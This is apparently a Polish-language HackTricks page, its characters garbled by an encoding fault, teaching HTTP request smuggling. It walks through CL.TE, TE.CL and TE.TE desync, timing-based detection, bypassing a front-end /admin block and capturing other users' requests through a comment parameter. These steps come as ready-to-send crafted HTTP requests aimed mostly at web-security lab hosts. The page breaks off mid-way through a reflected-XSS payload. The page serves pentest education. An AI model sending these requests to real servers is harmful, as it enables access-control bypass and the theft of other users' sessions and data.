# Atak na PrzesyÅ‚anie Å»Ä…daÅ„ HTTP / Atak Desynchronizacji HTTP

<details>

<summary><strong>Zacznij od zera i staÅ„ siÄ™ ekspertem w hakowaniu AWS dziÄ™ki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Co to jest

Ta podatnoÅ›Ä‡ wystÄ™puje, gdy **desynchronizacja** miÄ™dzy **serwerami proxy front-end** a **serwerem back-end** pozwala **atakujÄ…cemu** na **wysÅ‚anie** Å¼Ä…dania HTTP, ktÃ³re zostanie **zinterpretowane** jako **jedno Å¼Ä…danie** przez **serwery proxy front-end** (bilansowanie obciÄ…Å¼enia/przekierowanie) i **jako 2 Å¼Ä…dania** przez **serwer back-end**.\
Pozwala to uÅ¼ytkownikowi **zmodyfikowaÄ‡ nastÄ™pne Å¼Ä…danie, ktÃ³re dotrze do serwera back-end po jego**.

### Teoria

[**Specyfikacja RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> JeÅ›li wiadomoÅ›Ä‡ zostanie otrzymana zarÃ³wno z polem nagÅ‚Ã³wka Transfer-Encoding, jak i polem nagÅ‚Ã³wka Content-Length, to to drugie MUSI zostaÄ‡ zignorowane.

**Content-Length**

> NagÅ‚Ã³wek encji Content-Length wskazuje rozmiar ciaÅ‚a encji, w bajtach, wysÅ‚anej do odbiorcy.

**Transfer-Encoding: chunked**

> NagÅ‚Ã³wek Transfer-Encoding okreÅ›la formÄ™ kodowania uÅ¼ywanÄ… do bezpiecznego przesyÅ‚ania ciaÅ‚a Å‚adunku do uÅ¼ytkownika.\
> Chunked oznacza, Å¼e duÅ¼e dane sÄ… wysyÅ‚ane w serii kawaÅ‚kÃ³w.

### RzeczywistoÅ›Ä‡

**Serwer Front-End** (bilansowanie obciÄ…Å¼enia / Serwer Proxy Odwrotny) **przetwarza** nagÅ‚Ã³wek _**content-length**_ lub _**transfer-encoding**_, a **serwer Back-End** **przetwarza drugi**, co powoduje **desynchronizacjÄ™** miÄ™dzy tymi dwoma systemami.\
MoÅ¼e to byÄ‡ bardzo krytyczne, poniewaÅ¼ **atakujÄ…cy bÄ™dzie w stanie wysÅ‚aÄ‡ jedno Å¼Ä…danie** do serwera odwrotnego proxy, ktÃ³re zostanie **zinterpretowane** przez **serwer back-end jako 2 rÃ³Å¼ne Å¼Ä…dania**. **NiebezpieczeÅ„stwo** tej techniki polega na tym, Å¼e **serwer back-end zinterpretuje** **wstrzykniÄ™te drugie Å¼Ä…danie** tak, jakby **pochodziÅ‚o od nastÄ™pnego klienta**, a **rzeczywiste Å¼Ä…danie** tego klienta bÄ™dzie **czÄ™Å›ciÄ…** **wstrzykniÄ™tego Å¼Ä…dania**.

### SzczegÃ³lne przypadki

PamiÄ™taj, Å¼e w protokole HTTP **znak nowej linii skÅ‚ada siÄ™ z 2 bajtÃ³w:**

* **Content-Length**: Ten nagÅ‚Ã³wek uÅ¼ywa **liczby dziesiÄ™tnej** do wskazania **liczby** **bajtÃ³w** ciaÅ‚a Å¼Ä…dania. Oczekuje siÄ™, Å¼e ciaÅ‚o zakoÅ„czy siÄ™ na ostatnim znaku, **znak nowej linii nie jest potrzebny na koÅ„cu Å¼Ä…dania**.
* **Transfer-Encoding:** Ten nagÅ‚Ã³wek uÅ¼ywa w **ciale** liczby **szesnastkowej** do wskazania **liczby** **bajtÃ³w** **nastÄ™pnego kawaÅ‚ka**. **KawaÅ‚ek** musi **zakoÅ„czyÄ‡ siÄ™** znakiem **nowej linii**, ale ten znak **nie jest uwzglÄ™dniany** przez wskaÅºnik dÅ‚ugoÅ›ci. Ta metoda przesyÅ‚ania musi zakoÅ„czyÄ‡ siÄ™ **kawaÅ‚kiem o rozmiarze 0, po ktÃ³rym nastÄ™pujÄ… 2 znaki nowej linii**: `0`
* **Connection**: Na podstawie mojego doÅ›wiadczenia zaleca siÄ™ uÅ¼ycie **`Connection: keep-alive`** w pierwszym Å¼Ä…daniu ataku na PrzesyÅ‚anie Å»Ä…daÅ„.

## Podstawowe PrzykÅ‚ady

{% hint style="success" %}
PrÃ³bujÄ…c wykorzystaÄ‡ to za pomocÄ… Burp Suite, **wyÅ‚Ä…cz opcje `Update Content-Length` i `Normalize HTTP/1 line endings`** w repeaterze, poniewaÅ¼ niektÃ³re gadÅ¼ety naduÅ¼ywajÄ… znakÃ³w nowej linii, powrotÃ³w karetki i bÅ‚Ä™dnych dÅ‚ugoÅ›ci treÅ›ci.
{% endhint %}

Ataki na przesyÅ‚anie Å¼Ä…daÅ„ HTTP sÄ… tworzone poprzez wysyÅ‚anie dwuznacznych Å¼Ä…daÅ„, ktÃ³re wykorzystujÄ… rozbieÅ¼noÅ›ci w interpretacji nagÅ‚Ã³wkÃ³w `Content-Length` (CL) i `Transfer-Encoding` (TE) przez serwery front-end i back-end. Ataki te mogÄ… przybieraÄ‡ rÃ³Å¼ne formy, gÅ‚Ã³wnie jako **CL.TE**, **TE.CL** i **TE.TE**. KaÅ¼dy typ reprezentuje unikalne poÅ‚Ä…czenie sposobu, w jaki serwery front-end i back-end priorytetyzujÄ… te nagÅ‚Ã³wki. PodatnoÅ›ci wynikajÄ… z przetwarzania tego samego Å¼Ä…dania przez serwery w rÃ³Å¼ny sposÃ³b, prowadzÄ…c do nieoczekiwanych i potencjalnie zÅ‚oÅ›liwych rezultatÃ³w.

### Podstawowe PrzykÅ‚ady TypÃ³w PodatnoÅ›ci

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### PodatnoÅ›Ä‡ CL.TE (Content-Length uÅ¼ywane przez Front-End, Transfer-Encoding uÅ¼ywane przez Back-End)

* **Front-End (CL):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Content-Length`.
* **Back-End (TE):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Transfer-Encoding`.
* **Scenariusz Ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie, w ktÃ³rym wartoÅ›Ä‡ nagÅ‚Ã³wka `Content-Length` nie zgadza siÄ™ z rzeczywistÄ… dÅ‚ugoÅ›ciÄ… treÅ›ci.
* Serwer front-end przekazuje caÅ‚e Å¼Ä…danie do serwera back-end, na podstawie wartoÅ›ci `Content-Length`.
* Serwer back-end przetwarza Å¼Ä…danie jako kawaÅ‚kowe ze wzglÄ™du na nagÅ‚Ã³wek `Transfer-Encoding: chunked`, interpretujÄ…c pozostaÅ‚e dane jako oddzielne, nastÄ™pne Å¼Ä…danie.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### PodatnoÅ›Ä‡ TE.CL (Transfer-Encoding uÅ¼ywane przez Front-End, Content-Length uÅ¼ywane przez Back-End)

* **Front-End (TE):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Transfer-Encoding`.
* **Back-End (CL):** Przetwarza Å¼Ä…danie na podstawie nagÅ‚Ã³wka `Content-Length`.
* **Scenariusz Ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie kawaÅ‚kowe, gdzie rozmiar kawaÅ‚ka (`7b`) i rzeczywista dÅ‚ugoÅ›Ä‡ treÅ›ci (`Content-Length: 4`) nie zgadzajÄ… siÄ™.
* Serwer front-end, respektujÄ…c `Transfer-Encoding`, przekazuje caÅ‚e Å¼Ä…danie do serwera back-end.
* Serwer back-end, respektujÄ…c `Content-Length`, przetwarza jedynie poczÄ…tkowÄ… czÄ™Å›Ä‡ Å¼Ä…dania (`7b` bajtÃ³w), pozostawiajÄ…c resztÄ™ jako czÄ™Å›Ä‡ niezamierzonego nastÄ™pnego Å¼Ä…dania.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### Vulnerability TE.TE (Transfer-Encoding uÅ¼ywane przez obie, z zaciemnieniem)

* **Serwery:** Oba obsÅ‚ugujÄ… `Transfer-Encoding`, ale jeden moÅ¼na oszukaÄ‡, ignorujÄ…c go za pomocÄ… zaciemnienia.
* **Scenariusz ataku:**
* AtakujÄ…cy wysyÅ‚a Å¼Ä…danie z zaciemnionymi nagÅ‚Ã³wkami `Transfer-Encoding`.
* W zaleÅ¼noÅ›ci od tego, ktÃ³ry serwer (front-end lub back-end) nie rozpoznaje zaciemnienia, moÅ¼e zostaÄ‡ wykorzystana podatnoÅ›Ä‡ CL.TE lub TE.CL.
* Nieprzetworzona czÄ™Å›Ä‡ Å¼Ä…dania, widziana przez jeden z serwerÃ³w, staje siÄ™ czÄ™Å›ciÄ… kolejnego Å¼Ä…dania, co prowadzi do przemytu.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Scenariusz CL.CL (Content-Length uÅ¼ywane przez oba, front-end i back-end):**

* Oba serwery przetwarzajÄ… Å¼Ä…danie wyÅ‚Ä…cznie na podstawie nagÅ‚Ã³wka `Content-Length`.
* Ten scenariusz zazwyczaj nie prowadzi do przemytu, poniewaÅ¼ oba serwery interpretujÄ… dÅ‚ugoÅ›Ä‡ Å¼Ä…dania w sposÃ³b zgodny.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalne Å¼Ä…danie
```

#### **Scenariusz CL != 0:**

* Dotyczy scenariuszy, w ktÃ³rych nagÅ‚Ã³wek `Content-Length` jest obecny i ma wartoÅ›Ä‡ innÄ… niÅ¼ zero, co wskazuje, Å¼e ciaÅ‚o Å¼Ä…dania zawiera treÅ›Ä‡.
* Jest to istotne przy rozumieniu i tworzeniu atakÃ³w przemytu, poniewaÅ¼ wpÅ‚ywa na to, w jaki sposÃ³b serwery okreÅ›lajÄ… koniec Å¼Ä…dania.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

CiaÅ‚o nie jest puste
```

#### Uszkadzanie serwera WWW

Ta technika jest rÃ³wnieÅ¼ przydatna w scenariuszach, gdzie jest moÅ¼liwe **uszkodzenie serwera WWW podczas odczytywania poczÄ…tkowych danych HTTP**, ale **bez zamykania poÅ‚Ä…czenia**. W ten sposÃ³b **ciaÅ‚o** Å¼Ä…dania HTTP zostanie uznane za **nastÄ™pne Å¼Ä…danie HTTP**.

Na przykÅ‚ad, jak wyjaÅ›niono w [**tym opisie**](https://mizu.re/post/twisty-python), w Werkzeug byÅ‚o moÅ¼liwe wysÅ‚anie niektÃ³rych znakÃ³w **Unicode**, co spowoduje **uszkodzenie serwera**. Jednak jeÅ›li poÅ‚Ä…czenie HTTP zostaÅ‚o utworzone z nagÅ‚Ã³wkiem **`Connection: keep-alive`**, ciaÅ‚o Å¼Ä…dania nie zostanie odczytane, a poÅ‚Ä…czenie bÄ™dzie nadal otwarte, wiÄ™c **ciaÅ‚o** Å¼Ä…dania bÄ™dzie traktowane jako **nastÄ™pne Å¼Ä…danie HTTP**.

#### Wymuszanie za pomocÄ… nagÅ‚Ã³wkÃ³w hop-by-hop

WykorzystujÄ…c nagÅ‚Ã³wki hop-by-hop, moÅ¼na wskazaÄ‡ serwerowi proxy, aby **usunÄ…Å‚ nagÅ‚Ã³wek Content-Length lub Transfer-Encoding, dziÄ™ki czemu moÅ¼liwe bÄ™dzie naduÅ¼ycie przemytu HTTP**.
```
Connection: Content-Length
```
Dla **wiÄ™cej informacji na temat nagÅ‚Ã³wkÃ³w hop-by-hop** odwiedÅº:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Znajdowanie PodatnoÅ›ci na HTTP Request Smuggling

Identyfikacja podatnoÅ›ci na HTTP request smuggling czÄ™sto moÅ¼e byÄ‡ osiÄ…gniÄ™ta za pomocÄ… technik czasowych, ktÃ³re polegajÄ… na obserwowaniu, jak dÅ‚ugo serwer potrzebuje na odpowiedÅº na manipulowane Å¼Ä…dania. Te techniki sÄ… szczegÃ³lnie przydatne do wykrywania podatnoÅ›ci CL.TE i TE.CL. OprÃ³cz tych metod istniejÄ… inne strategie i narzÄ™dzia, ktÃ³re moÅ¼na wykorzystaÄ‡ do znalezienia takich podatnoÅ›ci:

### Znajdowanie PodatnoÅ›ci CL.TE Za PomocÄ… Technik Czasowych

* **Metoda:**
* WyÅ›lij Å¼Ä…danie, ktÃ³re, jeÅ›li aplikacja jest podatna, spowoduje, Å¼e serwer back-endowy bÄ™dzie czekaÅ‚ na dodatkowe dane.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Obserwacja:**
* Serwer front-endowy przetwarza Å¼Ä…danie na podstawie `Content-Length` i przerywa wiadomoÅ›Ä‡ przedwczeÅ›nie.
* Serwer back-endowy, oczekujÄ…c na wiadomoÅ›Ä‡ kawaÅ‚kowanÄ…, czeka na kolejny kawaÅ‚ek, ktÃ³ry nigdy nie przychodzi, powodujÄ…c opÃ³Åºnienie.
* **WskaÅºniki:**
* Timeouts lub dÅ‚ugie opÃ³Åºnienia w odpowiedzi.
* Otrzymanie bÅ‚Ä™du 400 Bad Request od serwera back-endowego, czasami z szczegÃ³Å‚owymi informacjami o serwerze.

### Znajdowanie PodatnoÅ›ci TE.CL Za PomocÄ… Technik Czasowych

* **Metoda:**
* WyÅ›lij Å¼Ä…danie, ktÃ³re, jeÅ›li aplikacja jest podatna, spowoduje, Å¼e serwer back-endowy bÄ™dzie czekaÅ‚ na dodatkowe dane.
*   **PrzykÅ‚ad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Obserwacja:**
* Serwer front-endowy przetwarza Å¼Ä…danie na podstawie `Transfer-Encoding` i przekazuje caÅ‚Ä… wiadomoÅ›Ä‡.
* Serwer back-endowy, oczekujÄ…c na wiadomoÅ›Ä‡ na podstawie `Content-Length`, czeka na dodatkowe dane, ktÃ³re nigdy nie przychodzÄ…, powodujÄ…c opÃ³Åºnienie.

### Inne Metody Znajdowania PodatnoÅ›ci

* **Analiza RÃ³Å¼nicowa Odpowiedzi:**
* WyÅ›lij nieco zrÃ³Å¼nicowane wersje Å¼Ä…dania i obserwuj, czy odpowiedzi serwera rÃ³Å¼niÄ… siÄ™ w niespodziewany sposÃ³b, co wskazuje na rozbieÅ¼noÅ›Ä‡ w parsowaniu.
* **UÅ¼ycie NarzÄ™dzi AutomatyzujÄ…cych:**
* NarzÄ™dzia takie jak rozszerzenie 'HTTP Request Smuggler' w Burp Suite mogÄ… automatycznie testowaÄ‡ te podatnoÅ›ci, wysyÅ‚ajÄ…c rÃ³Å¼ne formy niejednoznacznych Å¼Ä…daÅ„ i analizujÄ…c odpowiedzi.
* **Testy ZmiennoÅ›ci Content-Length:**
* WyÅ›lij Å¼Ä…dania z rÃ³Å¼nymi wartoÅ›ciami `Content-Length`, ktÃ³re nie sÄ… zgodne z rzeczywistÄ… dÅ‚ugoÅ›ciÄ… treÅ›ci i obserwuj, jak serwer radzi sobie z takimi niezgodnoÅ›ciami.
* **Testy ZmiennoÅ›ci Transfer-Encoding:**
* WyÅ›lij Å¼Ä…dania z zasÅ‚oniÄ™tymi lub znieksztaÅ‚conymi nagÅ‚Ã³wkami `Transfer-Encoding` i monitoruj, jak rÃ³Å¼nie serwery front-endowy i back-endowy reagujÄ… na takie manipulacje.

### Testowanie PodatnoÅ›ci na HTTP Request Smuggling

Po potwierdzeniu skutecznoÅ›ci technik czasowych, istotne jest zweryfikowanie, czy Å¼Ä…dania klienta moÅ¼na manipulowaÄ‡. ProstÄ… metodÄ… jest prÃ³ba zatrucia twoich Å¼Ä…daÅ„, na przykÅ‚ad wysÅ‚anie Å¼Ä…dania do `/` powinno skutkowaÄ‡ odpowiedziÄ… 404. PrzykÅ‚ady `CL.TE` i `TE.CL` omÃ³wione wczeÅ›niej w [Podstawowe PrzykÅ‚ady](./#basic-examples) pokazujÄ…, jak zatruÄ‡ Å¼Ä…danie klienta, aby wywoÅ‚aÄ‡ odpowiedÅº 404, mimo Å¼e klient chce uzyskaÄ‡ dostÄ™p do innych zasobÃ³w.

**Kluczowe RozwaÅ¼ania**

Podczas testowania podatnoÅ›ci na request smuggling poprzez ingerencjÄ™ w inne Å¼Ä…dania, pamiÄ™taj o:

* **OdrÄ™bne PoÅ‚Ä…czenia Sieciowe:** "Atak" i "normalne" Å¼Ä…dania powinny byÄ‡ wysyÅ‚ane przez oddzielne poÅ‚Ä…czenia sieciowe. UÅ¼ycie tego samego poÅ‚Ä…czenia dla obu nie potwierdza obecnoÅ›ci podatnoÅ›ci.
* **StaÅ‚e URL i Parametry:** Staraj siÄ™ uÅ¼ywaÄ‡ identycznych URL-i nazw parametrÃ³w dla obu Å¼Ä…daÅ„. Nowoczesne aplikacje czÄ™sto kierujÄ… Å¼Ä…dania do konkretnych serwerÃ³w back-endowych na podstawie URL-i parametrÃ³w. Dopasowanie ich zwiÄ™ksza prawdopodobieÅ„stwo, Å¼e oba Å¼Ä…dania sÄ… przetwarzane przez ten sam serwer, co jest warunkiem koniecznym do udanego ataku.
* **Warunki Czasowe i WyÅ›cigowe:** "Normalne" Å¼Ä…danie, majÄ…ce na celu wykrycie ingerencji z "atakujÄ…cego" Å¼Ä…dania, rywalizuje z innymi rÃ³wnoczesnymi Å¼Ä…daniami aplikacji. Dlatego wyÅ›lij "normalne" Å¼Ä…danie bezpoÅ›rednio po "atakujÄ…cym" Å¼Ä…daniu. W przypadku intensywnie obciÄ…Å¼onych aplikacji moÅ¼e byÄ‡ konieczne kilka prÃ³b, aby ostatecznie potwierdziÄ‡ podatnoÅ›Ä‡.
* **Wyzwania ZwiÄ…zane z Balansem ObciÄ…Å¼enia:** Serwery front-endowe dziaÅ‚ajÄ…ce jako balansery obciÄ…Å¼enia mogÄ… rozprowadzaÄ‡ Å¼Ä…dania na rÃ³Å¼ne systemy back-endowe. JeÅ›li "atakujÄ…ce" i "normalne" Å¼Ä…dania trafiÄ… na rÃ³Å¼ne systemy, atak siÄ™ nie powiedzie. Aspekt balansowania obciÄ…Å¼enia moÅ¼e wymagaÄ‡ kilku prÃ³b, aby potwierdziÄ‡ podatnoÅ›Ä‡.
* **Niekorzystny WpÅ‚yw na UÅ¼ytkownika:** JeÅ›li twÃ³j atak przypadkowo wpÅ‚ynie na Å¼Ä…danie innego uÅ¼ytkownika (nie na "normalne" Å¼Ä…danie wysÅ‚ane w celu wykrycia), oznacza to, Å¼e twÃ³j atak wpÅ‚ynÄ…Å‚ na innego uÅ¼ytkownika aplikacji. CiÄ…gÅ‚e testowanie moÅ¼e zakÅ‚Ã³ciÄ‡ innych uÅ¼ytkownikÃ³w, wymagajÄ…c ostroÅ¼nego podejÅ›cia.

## NaduÅ¼ywanie HTTP Request Smuggling

### Omijanie BezpieczeÅ„stwa Front-Endu za PoÅ›rednictwem HTTP Request Smuggling

Czasami proxy front-endowe narzucajÄ… Å›rodki bezpieczeÅ„stwa, analizujÄ…c przychodzÄ…ce Å¼Ä…dania. Jednak te Å›rodki mogÄ… byÄ‡ obejÅ›cia poprzez wykorzystanie HTTP Request Smuggling, umoÅ¼liwiajÄ…c nieautoryzowany dostÄ™p do ograniczonych punktÃ³w koÅ„cowych. Na przykÅ‚ad dostÄ™p do `/admin` moÅ¼e byÄ‡ zablokowany z zewnÄ…trz, a proxy front-endowy aktywnie blokuje takie prÃ³by. Niemniej jednak to proxy moÅ¼e zaniedbaÄ‡ sprawdzenie osadzonych Å¼Ä…daÅ„ w ramach przemyconego Å¼Ä…dania HTTP, pozostawiajÄ…c luki umoÅ¼liwiajÄ…ce obejÅ›cie tych ograniczeÅ„.

RozwaÅ¼ poniÅ¼sze przykÅ‚ady ilustrujÄ…ce, jak HTTP Request Smuggling moÅ¼e byÄ‡ wykorzystane do obejÅ›cia kontroli bezpieczeÅ„stwa front-endu, celujÄ…c szczegÃ³lnie w Å›cieÅ¼kÄ™ `/admin`, ktÃ³ra zazwyczaj jest chroniona przez proxy front-endowe:

**PrzykÅ‚ad CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
W ataku CL.TE nagÅ‚Ã³wek `Content-Length` jest wykorzystywany do poczÄ…tkowego Å¼Ä…dania, podczas gdy osadzone Å¼Ä…danie wykorzystuje nagÅ‚Ã³wek `Transfer-Encoding: chunked`. Przekierowanie front-endowe przetwarza poczÄ…tkowe Å¼Ä…danie `POST`, ale nie sprawdza osadzonego Å¼Ä…dania `GET /admin`, co umoÅ¼liwia nieautoryzowany dostÄ™p do Å›cieÅ¼ki `/admin`.

**PrzykÅ‚ad TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
W przeciwnym razie, w ataku TE.CL poczÄ…tkowe Å¼Ä…danie `POST` uÅ¼ywa `Transfer-Encoding: chunked`, a nastÄ™pne osadzone Å¼Ä…danie jest przetwarzane na podstawie nagÅ‚Ã³wka `Content-Length`. Podobnie jak w ataku CL.TE, proxy front-endu pomija przemycone Å¼Ä…danie `GET /admin`, nieumyÅ›lnie przyznajÄ…c dostÄ™p do ograniczonej Å›cieÅ¼ki `/admin`.

### Ujawnianie przepisywania Å¼Ä…dania front-endu <a href="#ujawnianie-przepisywania-Å¼Ä…dania-front-endu" id="ujawnianie-przepisywania-Å¼Ä…dania-front-endu"></a>

Aplikacje czÄ™sto korzystajÄ… z **serwera front-endowego** do modyfikowania przychodzÄ…cych Å¼Ä…daÅ„ przed przekazaniem ich do serwera back-endowego. Typowa modyfikacja polega na dodawaniu nagÅ‚Ã³wkÃ³w, takich jak `X-Forwarded-For: <IP klienta>`, aby przekazaÄ‡ IP klienta do back-endu. Zrozumienie tych modyfikacji moÅ¼e byÄ‡ kluczowe, poniewaÅ¼ moÅ¼e ujawniÄ‡ sposoby **omijania zabezpieczeÅ„** lub **odkrywania ukrytych informacji lub punktÃ³w koÅ„cowych**.

Aby zbadaÄ‡, w jaki sposÃ³b proxy zmienia Å¼Ä…danie, zlokalizuj parametr POST, ktÃ³ry back-end odbija w odpowiedzi. NastÄ™pnie stwÃ³rz Å¼Ä…danie, uÅ¼ywajÄ…c tego parametru na koÅ„cu, podobnie jak w poniÅ¼szym przykÅ‚adzie:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
W tej strukturze kolejne skÅ‚adniki Å¼Ä…dania sÄ… doÅ‚Ä…czane po `search=`, ktÃ³ry jest parametrem odzwierciedlonym w odpowiedzi. To odzwierciedlenie ujawni nagÅ‚Ã³wki kolejnego Å¼Ä…dania.

WaÅ¼ne jest, aby wyrÃ³wnaÄ‡ nagÅ‚Ã³wek `Content-Length` z dÅ‚ugoÅ›ciÄ… rzeczywistej zawartoÅ›ci zagnieÅ¼dÅ¼onego Å¼Ä…dania. Zaleca siÄ™ rozpoczÄ™cie od niewielkiej wartoÅ›ci i stopniowe zwiÄ™kszanie, poniewaÅ¼ zbyt niska wartoÅ›Ä‡ spowoduje uciÄ™cie odzwierciedlonych danych, podczas gdy zbyt wysoka wartoÅ›Ä‡ moÅ¼e spowodowaÄ‡ bÅ‚Ä…d Å¼Ä…dania.

Ta technika jest rÃ³wnieÅ¼ stosowana w kontekÅ›cie podatnoÅ›ci TE.CL, ale Å¼Ä…danie powinno zakoÅ„czyÄ‡ siÄ™ `search=\r\n0`. Bez wzglÄ™du na znaki nowej linii, wartoÅ›ci zostanÄ… doÅ‚Ä…czone do parametru wyszukiwania.

Ta metoda sÅ‚uÅ¼y gÅ‚Ã³wnie do zrozumienia modyfikacji Å¼Ä…dania dokonanych przez proxy front-end, co w zasadzie stanowi autorskÄ… analizÄ™.

### Przechwytywanie Å¼Ä…daÅ„ innych uÅ¼ytkownikÃ³w <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

MoÅ¼liwe jest przechwycenie Å¼Ä…daÅ„ nastÄ™pnego uÅ¼ytkownika, doÅ‚Ä…czajÄ…c okreÅ›lone Å¼Ä…danie jako wartoÅ›Ä‡ parametru podczas operacji POST. Oto jak to moÅ¼na osiÄ…gnÄ…Ä‡:

DoÅ‚Ä…czajÄ…c poniÅ¼sze Å¼Ä…danie jako wartoÅ›Ä‡ parametru, moÅ¼na przechowywaÄ‡ Å¼Ä…danie nastÄ™pnego klienta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
W tym scenariuszu **parametr komentarza** ma przechowywaÄ‡ treÅ›ci w sekcji komentarzy posta na publicznie dostÄ™pnej stronie. W rezultacie treÅ›Ä‡ nastÄ™pnego Å¼Ä…dania pojawi siÄ™ jako komentarz.

JednakÅ¼e ta technika ma swoje ograniczenia. Zazwyczaj przechwytuje dane tylko do ogranicznika parametru uÅ¼ytego w przemyconym Å¼Ä…daniu. Dla przesyÅ‚ek formularzy zakodowanych w formie URL, ten ogranicznik to znak `&`. Oznacza to, Å¼e przechwycone treÅ›ci z Å¼Ä…dania uÅ¼ytkownika ofiary zatrzymajÄ… siÄ™ na pierwszym `&`, ktÃ³ry moÅ¼e nawet byÄ‡ czÄ™Å›ciÄ… ciÄ…gu zapytania.

Dodatkowo warto zauwaÅ¼yÄ‡, Å¼e ten sposÃ³b jest rÃ³wnieÅ¼ wykonalny przy podatnoÅ›ci TE.CL. W takich przypadkach Å¼Ä…danie powinno zakoÅ„czyÄ‡ siÄ™ `search=\r\n0`. Bez wzglÄ™du na znaki nowej linii, wartoÅ›ci zostanÄ… doÅ‚Ä…czone do parametru wyszukiwania.

### Wykorzystanie przemyconego Å¼Ä…dania HTTP do eksploatacji odbitego XSS

Przemycone Å¼Ä…danie HTTP moÅ¼e byÄ‡ wykorzystane do eksploatacji stron internetowych podatnych na **Odbity XSS**, oferujÄ…c znaczÄ…ce korzyÅ›ci:

* Interakcja z uÅ¼ytkownikami docelowymi **nie jest wymagana**.
* Pozwala na eksploatacjÄ™ XSS w czÄ™Å›ciach Å¼Ä…dania, do ktÃ³rych **zazwyczaj nie moÅ¼na uzyskaÄ‡ dostÄ™pu**, takich jak nagÅ‚Ã³wki Å¼Ä…dania HTTP.

W przypadkach, gdy strona internetowa jest podatna na Odbity XSS poprzez nagÅ‚Ã³wek User-Agent, poniÅ¼szy Å‚adunek demonstruje, jak wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
